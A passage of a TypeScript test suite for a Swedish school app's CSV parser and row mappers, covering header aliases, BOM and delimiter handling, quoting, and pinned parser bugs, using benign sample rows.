/**
 * Adversarial tests for lib/csv.ts.
 *
 * Every assertion is a concrete value — no "toBeTruthy" hand-waving. Where
 * current behaviour is wrong (or contradicts the module's own doc comments),
 * the test PINS the current behaviour and carries a BUG comment; see the
 * "pinned bugs" describe at the bottom.
 */
import { describe, expect, it } from "vitest";

import {
  CSV_TEMPLATES,
  mapClassRows,
  mapMembershipRows,
  mapRequirementRows,
  mapRoomTypeRows,
  mapSubjectRows,
  classesToCsv,
  membershipsToCsv,
  requirementsToCsv,
  roomTypesToCsv,
  studentsToCsv,
  teachersToCsv,
  serializeCsv,
  subjectsToCsv,
  mapStudentRows,
  mapTeacherDutyRows,
  mapTeacherQualificationRows,
  mapTeacherRows,
  normalizeHeader,
  formatLengthSpec,
  parseLengthSpec,
  teacherQualificationsToCsv,
  parseCsv,
  templateCsvContent,
  type ImportKind,
} from "./csv";

const BOM = "﻿";

// ---------------------------------------------------------------------------
// normalizeHeader
// ---------------------------------------------------------------------------

describe("normalizeHeader", () => {
  it('normalizes "Förnamn" (NFC, precomposed ö) to "fornamn"', () => {
    expect(normalizeHeader("Förnamn")).toBe("fornamn");
  });

  it('normalizes "FORNAMN" to "fornamn"', () => {
    expect(normalizeHeader("FORNAMN")).toBe("fornamn");
  });

  it('normalizes " fornamn " (padded with spaces) to "fornamn"', () => {
    expect(normalizeHeader(" fornamn ")).toBe("fornamn");
  });

  it('normalizes NFD "Förnamn" (o + combining diaeresis) identically to NFC', () => {
    const nfd = "Förnamn"; // o followed by U+0308 COMBINING DIAERESIS
    const nfc = "Förnamn";
    expect(nfd).not.toBe(nfc); // sanity: the two inputs really differ
    expect(normalizeHeader(nfd)).toBe("fornamn");
    expect(normalizeHeader(nfd)).toBe(normalizeHeader(nfc));
  });

  it('normalizes "Årskurs" to "arskurs" and "Åk" to "ak"', () => {
    expect(normalizeHeader("Årskurs")).toBe("arskurs");
    expect(normalizeHeader("Åk")).toBe("ak");
  });

  it("keeps digits and strips underscores", () => {
    expect(normalizeHeader("Grupp_1")).toBe("grupp1");
    expect(normalizeHeader("for_namn")).toBe("fornamn"); // underscore variant matches the alias
    expect(normalizeHeader("epost2")).toBe("epost2"); // digits survive, so this does NOT match "epost"
  });

  it('normalizes "E-postadress" to "epostadress" (hyphen stripped, matches alias)', () => {
    expect(normalizeHeader("E-postadress")).toBe("epostadress");
  });

  it("strips a stray BOM character embedded in a header", () => {
    expect(normalizeHeader("﻿fornamn")).toBe("fornamn");
  });

  it("returns empty string for whitespace-only input", () => {
    expect(normalizeHeader("   ")).toBe("");
  });

  // The mojibake case is pinned in the "pinned bugs" describe below.
});

// ---------------------------------------------------------------------------
// parseCsv — BOM handling
// ---------------------------------------------------------------------------

describe("parseCsv — BOM handling", () => {
  it("strips a leading UTF-8 BOM before the first header", () => {
    const parsed = parseCsv(BOM + "fornamn;efternamn\r\nAlma;Berg\r\n");
    expect(parsed.headers).toEqual(["fornamn", "efternamn"]);
    expect(parsed.rows).toEqual([["Alma", "Berg"]]);
    expect(parsed.delimiter).toBe(";");
  });

  it("parses identically without a BOM", () => {
    const parsed = parseCsv("fornamn;efternamn\r\nAlma;Berg\r\n");
    expect(parsed.headers).toEqual(["fornamn", "efternamn"]);
    expect(parsed.rows).toEqual([["Alma", "Berg"]]);
  });

  it("treats a BOM-only file as empty", () => {
    expect(parseCsv(BOM)).toEqual({ headers: [], rows: [], delimiter: ";" });
  });

  it("survives a doubled BOM: parseCsv strips one, header trim() eats the other (U+FEFF is ECMAScript whitespace)", () => {
    const parsed = parseCsv(BOM + BOM + "fornamn\r\nAlma\r\n");
    expect(parsed.headers).toEqual(["fornamn"]);
    expect(parsed.rows).toEqual([["Alma"]]);
  });
});

// ---------------------------------------------------------------------------
// parseCsv — delimiter detection
// ---------------------------------------------------------------------------

describe("parseCsv — delimiter detection", () => {
  it("detects ; in a semicolon file", () => {
    const parsed = parseCsv("a;b;c\r\n1;2;3\r\n");
    expect(parsed.delimiter).toBe(";");
    expect(parsed.headers).toEqual(["a", "b", "c"]);
    expect(parsed.rows).toEqual([["1", "2", "3"]]);
  });

  it("detects , in a comma file", () => {
    const parsed = parseCsv("fornamn,efternamn\r\nAlma,Berg\r\n");
    expect(parsed.delimiter).toBe(",");
    expect(parsed.headers).toEqual(["fornamn", "efternamn"]);
    expect(parsed.rows).toEqual([["Alma", "Berg"]]);
  });

  it("breaks a tie (equal counts in the header) in favour of ; — the Swedish default", () => {
    const parsed = parseCsv("a;b,c\r\nx;y,z\r\n");
    expect(parsed.delimiter).toBe(";");
    expect(parsed.headers).toEqual(["a", "b,c"]);
    expect(parsed.rows).toEqual([["x", "y,z"]]);
  });

  it("ignores delimiters inside a quoted header field", () => {
    const parsed = parseCsv('"namn;extra",arskurs\r\n7A,7\r\n');
    expect(parsed.delimiter).toBe(",");
    expect(parsed.headers).toEqual(["namn;extra", "arskurs"]);
    expect(parsed.rows).toEqual([["7A", "7"]]);
  });

  it("defaults to ; for a single-column file with no delimiter at all", () => {
    const parsed = parseCsv("namn\r\n7A\r\n7B\r\n");
    expect(parsed.delimiter).toBe(";");
    expect(parsed.headers).toEqual(["namn"]);
    expect(parsed.rows).toEqual([["7A"], ["7B"]]);
  });

  it("defaults to ; for the empty string", () => {
    expect(parseCsv("")).toEqual({ headers: [], rows: [], delimiter: ";" });
  });

  it("detects from the first line only, even when data rows disagree", () => {
    const parsed = parseCsv("a;b\r\n1,x;2\r\n");
    expect(parsed.delimiter).toBe(";");
    expect(parsed.rows).toEqual([["1,x", "2"]]);
  });
});

// ---------------------------------------------------------------------------
// parseCsv — RFC 4180 quoting
// ---------------------------------------------------------------------------

describe("parseCsv — RFC 4180 quoting", () => {
  it("keeps the delimiter inside a quoted field", () => {
    const parsed = parseCsv('namn;kommentar\r\n7A;"a;b"\r\n');
    expect(parsed.rows).toEqual([["7A", "a;b"]]);
  });

  it('unescapes doubled quotes: "say ""hej""" -> say "hej"', () => {
    const parsed = parseCsv('namn;kommentar\r\n7A;"say ""hej"""\r\n');
    expect(parsed.rows).toEqual([["7A", 'say "hej"']]);
  });

  it("keeps a CRLF newline inside a quoted field as one multi-line cell", () => {
    const parsed = parseCsv('namn;kommentar\r\n7A;"rad1\r\nrad2"\r\n');
    expect(parsed.headers).toEqual(["namn", "kommentar"]);
    expect(parsed.rows).toEqual([["7A", "rad1\r\nrad2"]]);
  });

  it("keeps a bare LF inside a quoted field", () => {
    const parsed = parseCsv('namn;kommentar\n7A;"rad1\nrad2"\n7B;x\n');
    expect(parsed.rows).toEqual([
      ["7A", "rad1\nrad2"],
      ["7B", "x"],
    ]);
  });

  it("treats a quote appearing mid-field (not at field start) as a literal character", () => {
    const parsed = parseCsv('h1;h2\r\na"b;c\r\n');
    expect(parsed.rows).toEqual([['a"b', "c"]]);
  });

  it("appends trailing characters after a closing quote to the same field (lenient)", () => {
    const parsed = parseCsv('h1;h2\r\n"ab"cd;x\r\n');
    expect(parsed.rows).toEqual([["abcd", "x"]]);
  });

  it("keeps the content of an unterminated quote at EOF as the final field", () => {
    const parsed = parseCsv('namn\r\n"abc');
    expect(parsed.headers).toEqual(["namn"]);
    expect(parsed.rows).toEqual([["abc"]]);
  });

  it("an unterminated quote swallows the rest of the file into one cell (current behaviour)", () => {
    const parsed = parseCsv('namn;x\r\n"oops;1\r\n7B;2\r\n');
    // The open quote eats the delimiter, the CRLF and the next record; the
    // trailing CRLF is then trim()med off and the row padded to header width.
    expect(parsed.rows).toEqual([["oops;1\r\n7B;2", ""]]);
  });

  it("parses an empty quoted field as empty string", () => {
    const parsed = parseCsv('a;b;c\r\n1;"";3\r\n');
    expect(parsed.rows).toEqual([["1", "", "3"]]);
  });

  it("trims whitespace even inside quoted fields (quoting does not preserve padding)", () => {
    const parsed = parseCsv('a;b\r\n"  padded  ";x\r\n');
    expect(parsed.rows).toEqual([["padded", "x"]]);
  });
});

// ---------------------------------------------------------------------------
// parseCsv — line endings, blank lines
// ---------------------------------------------------------------------------

describe("parseCsv — line endings and blank lines", () => {
  it("parses CRLF endings", () => {
    expect(parseCsv("a;b\r\n1;2\r\n3;4\r\n").rows).toEqual([
      ["1", "2"],
      ["3", "4"],
    ]);
  });

  it("parses bare LF endings", () => {
    expect(parseCsv("a;b\n1;2\n3;4\n").rows).toEqual([
      ["1", "2"],
      ["3", "4"],
    ]);
  });

  it("parses bare CR endings (old Mac)", () => {
    expect(parseCsv("a;b\r1;2\r3;4\r").rows).toEqual([
      ["1", "2"],
      ["3", "4"],
    ]);
  });

  it("parses mixed line endings in one file", () => {
    expect(parseCsv("a;b\r\n1;2\n3;4\r5;6\r\n").rows).toEqual([
      ["1", "2"],
      ["3", "4"],
      ["5", "6"],
    ]);
  });

  it("parses identically with and without a trailing newline", () => {
    expect(parseCsv("a;b\r\n1;2").rows).toEqual([["1", "2"]]);
    expect(parseCsv("a;b\r\n1;2\r\n").rows).toEqual([["1", "2"]]);
  });

  it("a trailing delimiter at EOF still yields the final empty field", () => {
    expect(parseCsv("a;b;c\r\n1;2;").rows).toEqual([["1", "2", ""]]);
  });

  it("drops fully blank lines between records", () => {
    expect(parseCsv("a;b\r\n\r\n\r\n1;2\r\n\r\n3;4\r\n").rows).toEqual([
      ["1", "2"],
      ["3", "4"],
    ]);
  });

  it("drops whitespace-only lines and lines of only delimiters", () => {
    expect(parseCsv("a;b\r\n   \r\n;\r\n \t ; \r\n1;2\r\n").rows).toEqual([
      ["1", "2"],
    ]);
  });
});

// ---------------------------------------------------------------------------
// parseCsv — row shape
// ---------------------------------------------------------------------------

describe("parseCsv — row shape", () => {
  it("pads short rows with empty strings up to the header width", () => {
    expect(parseCsv("a;b;c\r\n1\r\n").rows).toEqual([["1", "", ""]]);
  });

  it("truncates long rows to the header width", () => {
    expect(parseCsv("a;b\r\n1;2;3;4\r\n").rows).toEqual([["1", "2"]]);
  });

  it("returns headers and zero rows for a header-only file", () => {
    const parsed = parseCsv("fornamn;efternamn;epost\r\n");
    expect(parsed.headers).toEqual(["fornamn", "efternamn", "epost"]);
    expect(parsed.rows).toEqual([]);
  });

  it("returns empty everything for the completely empty string", () => {
    expect(parseCsv("")).toEqual({ headers: [], rows: [], delimiter: ";" });
  });

  it("trims headers and cell values", () => {
    const parsed = parseCsv(" fornamn ; efternamn \r\n Alma ; Berg \r\n");
    expect(parsed.headers).toEqual(["fornamn", "efternamn"]);
    expect(parsed.rows).toEqual([["Alma", "Berg"]]);
  });
});

// ---------------------------------------------------------------------------
// templateCsvContent
// ---------------------------------------------------------------------------

const ALL_KINDS: ImportKind[] = [
  "students",
  "teachers",
  "classes",
  "teachingGroups",
  "requirements",
  "teacherQualifications",
  "teacherDuties",
];

describe("templateCsvContent", () => {
  it.each(ALL_KINDS)("%s: starts with the UTF-8 BOM", (kind) => {
    const content = templateCsvContent(kind);
    expect(content.charCodeAt(0)).toBe(0xfeff);
    expect(content.startsWith(BOM)).toBe(true);
  });

  it.each(ALL_KINDS)("%s: is ;-separated, CRLF-terminated, and ends with CRLF", (kind) => {
    const content = templateCsvContent(kind);
    expect(content.endsWith("\r\n")).toBe(true);
    expect(content).not.toContain(",");
    expect(content).toContain(";");
    // Every \n is preceded by \r and every \r followed by \n — pure CRLF.
    expect(/(?<!\r)\n/.test(content)).toBe(false);
    expect(/\r(?!\n)/.test(content)).toBe(false);
  });

  it("classes template is byte-exact", () => {
    expect(templateCsvContent("classes")).toBe(
      BOM + "namn;arskurs\r\n7A;7\r\n7B;7\r\n",
    );
  });

  it.each(ALL_KINDS)("%s: round-trips through parseCsv to its own headers and rows", (kind) => {
    const parsed = parseCsv(templateCsvContent(kind));
    expect(parsed.delimiter).toBe(";");
    expect(parsed.headers).toEqual(CSV_TEMPLATES[kind].headers);
    expect(parsed.rows).toEqual(CSV_TEMPLATES[kind].exampleRows);
  });

  it("each template maps through its own mapper with zero errors", () => {
    const students = mapStudentRows(parseCsv(templateCsvContent("students")));
    expect(students.errors).toEqual([]);
    expect(students.rows).toEqual([
      {
        firstName: "Alma",
        lastName: "Berg",
        email: "alma.berg@example.com",
        className: "7A",
      },
    ]);

    const teachers = mapTeacherRows(parseCsv(templateCsvContent("teachers")));
    expect(teachers.errors).toEqual([]);
    // Row one states a post; row two leaves the four columns blank and comes
    // out as the three-field row the gateway has always taken — the post keys
    // are ABSENT, not null, so a plain staff list says nothing about posts.
    expect(teachers.rows).toStrictEqual([
      {
        firstName: "Karin",
        lastName: "Ek",
        email: "karin.ek@example.com",
        employmentPercent: 100,
        contractKind: "FERIE",
        signature: "KEK",
      },
      { firstName: "Bo", lastName: "Alm", email: "bo.alm@example.com" },
    ]);

    const qualifications = mapTeacherQualificationRows(
      parseCsv(templateCsvContent("teacherQualifications")),
    );
    expect(qualifications.errors).toEqual([]);
    expect(qualifications.rows).toEqual([
      { teacherEmail: "karin.ek@example.com", subject: "MA", minGrade: 7, maxGrade: 9, kind: "LEGITIMATION" },
      { teacherEmail: "karin.ek@example.com", subject: "NO", minGrade: 7, maxGrade: 9, kind: "BEHORIG" },
      { teacherEmail: "bo.alm@example.com", subject: "SLTX", minGrade: 1, maxGrade: 9, kind: "TILLATEN" },
    ]);

    const duties = mapTeacherDutyRows(parseCsv(templateCsvContent("teacherDuties")));
    expect(duties.errors).toEqual([]);
    expect(duties.rows).toStrictEqual([
      {
        teacherEmail: "karin.ek@example.com",
        kind: "MENTORSKAP",
        label: "Mentor 7B",
        minutesPerWeek: 90,
        countsAsTeaching: false,
        subject: null,
        groupName: "7B",
        note: null,
      },
      {
        teacherEmail: "karin.ek@example.com",
        kind: "APT_KONFERENS",
        label: "APT",
        minutesPerWeek: 120,
        countsAsTeaching: false,
        subject: null,
        groupName: null,
        note: null,
      },
      {
        teacherEmail: "bo.alm@example.com",
        kind: "AMNESANSVAR",
        label: "Ämnesansvar slöjd",
        minutesPerWeek: 60,
        countsAsTeaching: true,
        subject: "SLTX",
        groupName: null,
        note: null,
      },
    ]);

    const classes = mapClassRows(parseCsv(templateCsvContent("classes")));
    expect(classes.errors).toEqual([]);
    expect(classes.rows).toStrictEqual([
      { name: "7A", gradeLevel: 7 },
      { name: "7B", gradeLevel: 7 },
    ]);

    const memberships = mapMembershipRows(
      parseCsv(templateCsvContent("teachingGroups")),
    );
    expect(memberships.errors).toEqual([]);
    expect(memberships.rows).toEqual([
      { groupName: "Ma71", email: "alma.berg@example.com" },
      { groupName: "Sv73", email: "alma.berg@example.com" },
    ]);
  });
});

// ---------------------------------------------------------------------------
// mapTeacherRows / mapStudentRows
// ---------------------------------------------------------------------------

describe("mapTeacherRows", () => {
  it("reports a single row-0 error naming ALL missing required columns", () => {
    const result = mapTeacherRows(parseCsv("foo;bar\r\nx;y\r\n"));
    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      {
        row: 0,
        message:
          "Kolumner saknas: fornamn, efternamn, epost. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  it("reports row 0 naming only the one missing column", () => {
    const result = mapTeacherRows(parseCsv("fornamn;efternamn\r\nKarin;Ek\r\n"));
    expect(result.errors).toEqual([
      {
        row: 0,
        message: "Kolumner saknas: epost. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  it("reports an empty required cell with its 1-based data-row number", () => {
    const csv =
      "fornamn;efternamn;epost\r\nKarin;Ek;karin@example.com\r\nBo;Alm;\r\nEva;Lund;eva@example.com\r\n";
    const result = mapTeacherRows(parseCsv(csv));
    expect(result.errors).toEqual([
      { row: 2, message: 'Rad 2: kolumnen "epost" är tom.' },
    ]);
    expect(result.rows).toEqual([
      { firstName: "Karin", lastName: "Ek", email: "karin@example.com" },
      { firstName: "Eva", lastName: "Lund", email: "eva@example.com" },
    ]);
  });

  it('a row of only empty cells (";;") is dropped as a blank line, not reported', () => {
    const result = mapTeacherRows(parseCsv("fornamn;efternamn;epost\r\n;;\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toEqual([]);
  });

  it("reports only the FIRST empty required cell per row (spec order)", () => {
    // fornamn and efternamn are both empty; only fornamn is reported.
    const result = mapTeacherRows(
      parseCsv("fornamn;efternamn;epost\r\n;;x@example.com\r\n"),
    );
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "fornamn" är tom.' },
    ]);
    expect(result.rows).toEqual([]);
  });

  it("accepts alias headers: email for epost, case-insensitive with diacritics", () => {
    const csv = "Förnamn;Efternamn;Email\r\nKarin;Ek;karin@example.com\r\n";
    const result = mapTeacherRows(parseCsv(csv));
    expect(result.errors).toEqual([]);
    expect(result.rows).toEqual([
      { firstName: "Karin", lastName: "Ek", email: "karin@example.com" },
    ]);
  });

  it("accepts the E-postadress alias", () => {
    const csv = "fornamn;efternamn;E-postadress\r\nKarin;Ek;k@example.com\r\n";
    expect(mapTeacherRows(parseCsv(csv)).rows).toEqual([
      { firstName: "Karin", lastName: "Ek", email: "k@example.com" },
    ]);
  });

  it("returns zero rows and zero errors for a header-only file", () => {
    const result = mapTeacherRows(parseCsv("fornamn;efternamn;epost\r\n"));
    expect(result).toEqual({ rows: [], errors: [], rowNumbers: [] });
  });

  it("blank lines do not advance the reported row number (row = data-row index, not file line)", () => {
    const csv = "fornamn;efternamn;epost\r\n\r\n\r\nKarin;Ek;\r\n";
    const result = mapTeacherRows(parseCsv(csv));
    // Physically line 4 of the file, but data row 1 after blank lines are dropped.
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "epost" är tom.' },
    ]);
  });
});

describe("mapStudentRows", () => {
  it("requires klass and reports it when missing", () => {
    const csv = "fornamn;efternamn;epost\r\nAlma;Berg;a@example.com\r\n";
    const result = mapStudentRows(parseCsv(csv));
    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      {
        row: 0,
        message: "Kolumner saknas: klass. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  it("maps a comma-separated file with alias headers", () => {
    const csv =
      "firstname,lastname,email,class\r\nAlma,Berg,alma@example.com,7A\r\n";
    const result = mapStudentRows(parseCsv(csv));
    expect(result.errors).toEqual([]);
    expect(result.rows).toEqual([
      {
        firstName: "Alma",
        lastName: "Berg",
        email: "alma@example.com",
        className: "7A",
      },
    ]);
  });

  it("reports an empty klass cell with its row number", () => {
    const csv =
      "fornamn;efternamn;epost;klass\r\nAlma;Berg;a@example.com;7A\r\nBo;Ek;b@example.com;\r\n";
    const result = mapStudentRows(parseCsv(csv));
    expect(result.errors).toEqual([
      { row: 2, message: 'Rad 2: kolumnen "klass" är tom.' },
    ]);
    expect(result.rows).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// mapClassRows
// ---------------------------------------------------------------------------

describe("mapClassRows", () => {
  it("reports row 0 when the name column is missing", () => {
    const result = mapClassRows(parseCsv("arskurs\r\n7\r\n"));
    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      { row: 0, message: "Kolumner saknas: namn. Ladda ner mallen och utgå från den." },
    ]);
  });

  it("empty grade cell is OK — the row is kept WITHOUT a gradeLevel key", () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\n7A;\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toStrictEqual([{ name: "7A" }]);
  });

  it("a missing grade column entirely is OK", () => {
    const result = mapClassRows(parseCsv("namn\r\n7A\r\n7B\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toStrictEqual([{ name: "7A" }, { name: "7B" }]);
  });

  it('grade "7" parses to the number 7', () => {
    expect(mapClassRows(parseCsv("namn;arskurs\r\n7A;7\r\n")).rows).toStrictEqual([
      { name: "7A", gradeLevel: 7 },
    ]);
  });

  it("boundary grades 0 and 12 are accepted", () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\nF;0\r\nGy3;12\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toStrictEqual([
      { name: "F", gradeLevel: 0 },
      { name: "Gy3", gradeLevel: 12 },
    ]);
  });

  it("grade 13 is rejected with the row number", () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\nX;13\r\n"));
    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: årskurs "13" är inte ett tal mellan 0 och 12.' },
    ]);
  });

  it("grade -1 is rejected", () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\nX;-1\r\n"));
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: årskurs "-1" är inte ett tal mellan 0 och 12.' },
    ]);
  });

  it('grade "abc" is rejected with the row number, and later rows still map', () => {
    const result = mapClassRows(
      parseCsv("namn;arskurs\r\n7A;7\r\n7B;abc\r\n7C;8\r\n"),
    );
    expect(result.errors).toEqual([
      { row: 2, message: 'Rad 2: årskurs "abc" är inte ett tal mellan 0 och 12.' },
    ]);
    expect(result.rows).toStrictEqual([
      { name: "7A", gradeLevel: 7 },
      { name: "7C", gradeLevel: 8 },
    ]);
  });

  it('grade "7,5" (Swedish decimal comma) is rejected', () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\n7A;7,5\r\n"));
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: årskurs "7,5" är inte ett tal mellan 0 och 12.' },
    ]);
  });

  it('grade "7.5" is rejected (not an integer)', () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\n7A;7.5\r\n"));
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: årskurs "7.5" är inte ett tal mellan 0 och 12.' },
    ]);
  });

  it("empty name cell is reported with its row number", () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\n;7\r\n7B;8\r\n"));
    expect(result.errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "namn" är tom.' },
    ]);
    expect(result.rows).toStrictEqual([{ name: "7B", gradeLevel: 8 }]);
  });

  it('accepts "klass" and "åk" as header aliases', () => {
    const result = mapClassRows(parseCsv("Klass;Åk\r\n7A;7\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toStrictEqual([{ name: "7A", gradeLevel: 7 }]);
  });

  // Number() is permissive: pin the quirk so a future fix is a conscious change.
  it('QUIRK (pinned): scientific notation "1e1" is accepted as gradeLevel 10', () => {
    const result = mapClassRows(parseCsv("namn;arskurs\r\nX;1e1\r\n"));
    expect(result.errors).toEqual([]);
    expect(result.rows).toStrictEqual([{ name: "X", gradeLevel: 10 }]);
  });
});

// ---------------------------------------------------------------------------
// mapMembershipRows
// ---------------------------------------------------------------------------

describe("mapMembershipRows", () => {
  it("maps grupp + epost", () => {
    const csv = "grupp;epost\r\nMa71;a@example.com\r\n";
    expect(mapMembershipRows(parseCsv(csv)).rows).toEqual([
      { groupName: "Ma71", email: "a@example.com" },
    ]);
  });

  it('accepts "Undervisningsgrupp" and "Elev" as header aliases', () => {
    const csv = "Undervisningsgrupp;Elev\r\nMa71;a@example.com\r\n";
    const result = mapMembershipRows(parseCsv(csv));
    expect(result.errors).toEqual([]);
    expect(result.rows).toEqual([{ groupName: "Ma71", email: "a@example.com" }]);
  });

  it("duplicate group names pass through untouched — dedup is the server's job", () => {
    const csv =
      "grupp;epost\r\nMa71;a@example.com\r\nMa71;b@example.com\r\nMa71;a@example.com\r\n";
    const result = mapMembershipRows(parseCsv(csv));
    expect(result.errors).toEqual([]);
    expect(result.rows).toEqual([
      { groupName: "Ma71", email: "a@example.com" },
      { groupName: "Ma71", email: "b@example.com" },
      { groupName: "Ma71", email: "a@example.com" }, // exact duplicate row also kept
    ]);
  });

  it("reports both missing columns at row 0", () => {
    const result = mapMembershipRows(parseCsv("x;y\r\n1;2\r\n"));
    expect(result.errors).toEqual([
      {
        row: 0,
        message: "Kolumner saknas: grupp, epost. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  it("reports an empty grupp cell with its row number", () => {
    const csv = "grupp;epost\r\n;a@example.com\r\n";
    expect(mapMembershipRows(parseCsv(csv)).errors).toEqual([
      { row: 1, message: 'Rad 1: kolumnen "grupp" är tom.' },
    ]);
  });
});

// ---------------------------------------------------------------------------
// Pinned bugs — these tests document CURRENT (wrong or comment-contradicting)
// behaviour. If one of these starts failing, the underlying bug was probably
// fixed: update the test to assert the CORRECT behaviour instead.
// ---------------------------------------------------------------------------

describe("pinned bugs (documenting current behaviour)", () => {
  /**
   * BUG 1: normalizeHeader's doc comment claims the mojibake artifact
   * "FÃ¶rnamn" (UTF-8 "Förnamn" mis-decoded as Latin-1/CP1252) "resolves
   * alike" with "fornamn". It does NOT: Ã (U+00C3) NFD-decomposes to
   * A + combining tilde, so the header normalizes to "farnamn" — 'a', not
   * 'o' — and can never match the "fornamn" alias. A wrongly-decoded file
   * therefore fails with "Kolumner saknas" despite the module's stated
   * intent to survive exactly this artifact.
   */
  it('mojibake by design (a): mojibake "FÃ¶rnamn" normalizes to "farnamn", NOT "fornamn"', () => {
    const mojibake = "FÃ¶rnamn"; // F + Ã + ¶ + rnamn
    expect(normalizeHeader(mojibake)).toBe("farnamn");
    expect(normalizeHeader(mojibake)).not.toBe("fornamn");
  });

  it("mojibake by design (b): a teacher file with a mojibake header fails with a missing-column error", () => {
    const csv = "FÃ¶rnamn;Efternamn;Epost\r\nKarin;Ek;k@example.com\r\n";
    const result = mapTeacherRows(parseCsv(csv));
    expect(result.rows).toEqual([]);
    expect(result.errors).toEqual([
      {
        row: 0,
        message: "Kolumner saknas: fornamn. Ladda ner mallen och utgå från den.",
      },
    ]);
  });

  /**
   * BUG 2: delimiter detection slices the "header line" at the FIRST line
   * break in the file — even one INSIDE a quoted header field. For a
   * comma-separated file whose first header cell contains a quoted newline,
   * detection sees only `"multi`, counts zero of both delimiters, and the
   * `semicolons >= commas` tie-break picks ";". The whole file then parses
   * as a single mangled column. (A ;-file with the same shape survives only
   * because ";" is also the tie-break default.)
   */
  it("a quoted newline in the header no longer defeats delimiter detection", () => {
    // Detection scans to the first UNQUOTED line break, so the full header
    // row — including the delimiter after the multi-line cell — is visible.
    const parsed = parseCsv('"multi\nline",col2\nv1,v2\n');
    expect(parsed.delimiter).toBe(",");
    expect(parsed.headers).toEqual(["multi\nline", "col2"]);
    expect(parsed.rows).toEqual([["v1", "v2"]]);
  });

  it("the same shape in a ;-file parses identically", () => {
    const parsed = parseCsv('"multi\nline";col2\r\nv1;v2\r\n');
    expect(parsed.delimiter).toBe(";");
    expect(parsed.headers).toEqual(["multi\nline", "col2"]);
    expect(parsed.rows).toEqual([["v1", "v2"]]);
  });
});

describe("room types", () => {
  it("ships a template a Swedish school can fill in as-is", () => {
    const content = templateCsvContent("roomTypes");

    expect(content.startsWith("\uFEFF")).toBe(true); // Excel keeps å/ä/ö
    expect(content).toContain("namn");
    expect(content).toContain("Trä- och metallslöjd");
    expect(content.endsWith("\r\n")).toBe(true);
    expect(CSV_TEMPLATES.roomTypes.filename).toBe("salstyper.csv");
  });

  it("round-trips its own template through the parser and mapper", () => {
    const { rows, errors } = mapRoomTypeRows(parseCsv(templateCsvContent("roomTypes")));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      { name: "Hemkunskapssal" },
      { name: "Trä- och metallslöjd" },
      { name: "Textilslöjd" },
    ]);
  });

  it("accepts the spellings a human would reach for", () => {
    for (const header of ["namn", "Namn", "salstyp", "Typ", "name"]) {
      const { rows, errors } = mapRoomTypeRows(parseCsv(`${header}\nTextilslöjd\n`));
      expect(errors).toEqual([]);
      expect(rows).toEqual([{ name: "Textilslöjd" }]);
    }
  });

  it("names the missing column instead of importing nothing silently", () => {
    const { rows, errors } = mapRoomTypeRows(parseCsv("kapacitet\n30\n"));

    expect(rows).toEqual([]);
    expect(errors).toEqual([
      { row: 0, message: expect.stringContaining("namn") },
    ]);
  });

  it("reports an empty cell with its 1-based data row number", () => {
    const { rows, errors } = mapRoomTypeRows(
      parseCsv("namn\nBildsal\n\nMusiksal\n"),
    );

    // The blank line is dropped, so Musiksal is row 2 — not row 3.
    expect(rows).toEqual([{ name: "Bildsal" }, { name: "Musiksal" }]);
    expect(errors).toEqual([]);
  });
});

describe("subjects", () => {
  const subject = (
    name: string,
    code: string | null,
    color: string | null,
    requiredRoomTypeId: string | null,
    nationalCode: string | null = null,
    countsTowardTimplan = true,
  ) => ({ name, code, color, requiredRoomTypeId, nationalCode, countsTowardTimplan });

  const named = (id: string | null) =>
    id === "rt-tx" ? "Textilslöjd" : id === "rt-lab" ? "Laborationssal" : "";

  it("ships a template with the columns the importer reads", () => {
    const { rows, errors } = mapSubjectRows(parseCsv(templateCsvContent("subjects")));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      {
        name: "Matematik",
        code: "MA",
        color: "#4f46e5",
        roomType: "",
        nationalCode: "MA",
        countsTowardTimplan: true,
      },
      {
        name: "Textilslöjd",
        code: "SLTX",
        color: "#db2777",
        roomType: "Textilslöjd",
        nationalCode: "SL",
        countsTowardTimplan: true,
      },
      // The example that shows what the flag is for.
      {
        name: "Mentorstid",
        code: "MT",
        color: "#64748b",
        roomType: "",
        nationalCode: null,
        countsTowardTimplan: false,
      },
    ]);
  });

  it("reads a file from before the timplan columns exactly as it always did", () => {
    // Absent columns are the defaults the server applies: outside the national
    // timplan, and counting as teaching time. Null, not false — the server's
    // DTO lets null mean "default", and false would silently drop the subject
    // from every undervisningstid sum.
    const { rows, errors } = mapSubjectRows(parseCsv("namn;kod;farg;salstyp\nBild;BL;;\n"));

    expect(errors).toEqual([]);
    expect(rows).toEqual([
      {
        name: "Bild",
        code: "BL",
        color: "",
        roomType: "",
        nationalCode: null,
        countsTowardTimplan: null,
      },
    ]);
  });

  it("reads ja and nej in the spellings a spreadsheet produces, and an empty cell as null", () => {
    const csv =
      "namn;undervisningstid\n" +
      "A;ja\nB;Ja\nC;J\nD;true\nE;1\nF;x\n" +
      "G;nej\nH;NEJ\nI;n\nJ;false\nK;0\n" +
      "L;\nM;   \n";
